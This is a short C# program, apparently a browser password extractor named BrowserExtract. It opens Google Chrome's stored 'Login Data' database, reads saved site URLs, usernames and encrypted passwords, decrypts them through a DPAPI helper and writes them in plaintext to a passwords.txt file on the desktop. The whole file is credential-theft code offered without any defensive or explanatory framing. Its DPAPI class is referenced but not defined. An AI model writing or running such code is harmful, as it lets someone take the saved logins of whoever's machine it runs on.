using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Data.SQLite;
using System.IO;

namespace BrowserExtract
{
    class Program
    {
        static void Main(string[] args)
        {
            string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\..\Local\Google\Chrome\User Data\Default\Login Data";
            SQLiteConnection connection = new SQLiteConnection("Data Source=" + path);
            connection.Open();

            SQLiteCommand command = new SQLiteCommand(connection);
            command.CommandText = String.Format("SELECT action_url, username_value, password_value FROM logins");
            	SQLiteDataReader reader = command.ExecuteReader();

                StreamWriter writer = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + @"\passwords.txt");

            while (reader.Read())
            {
                byte[] password = (byte[])reader[2];
                string plaintext = DPAPI.Decrypt(Convert.ToBase64String(password));

                if (reader[0].ToString() != "")
                {
                    writer.Write(reader[0].ToString() + " ; " + reader[1].ToString() + " ; " + plaintext + "\n");
                }

            }
            connection.Close();
        }
    }
}
